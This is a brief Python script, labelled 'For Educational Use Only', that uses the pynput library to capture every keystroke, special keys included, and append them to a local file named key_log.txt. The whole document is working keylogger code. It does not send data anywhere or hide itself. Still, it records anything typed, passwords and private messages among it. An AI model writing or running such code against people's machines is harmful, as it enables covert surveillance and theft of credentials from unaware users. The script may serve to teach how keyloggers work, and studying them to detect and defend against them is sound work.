from pynput import keyboard
import os

# Log file path
log_file = "key_log.txt"

# Create or clear the log file at the start
with open(log_file, "w") as f:
    f.write("Keylogger Started (For Educational Use Only)\n")

# Function to write keys to the file
def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # For special keys like space, enter, etc.
        with open(log_file, "a") as f:
            f.write(f" [{key}] ")

# Start listening to the keyboard
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
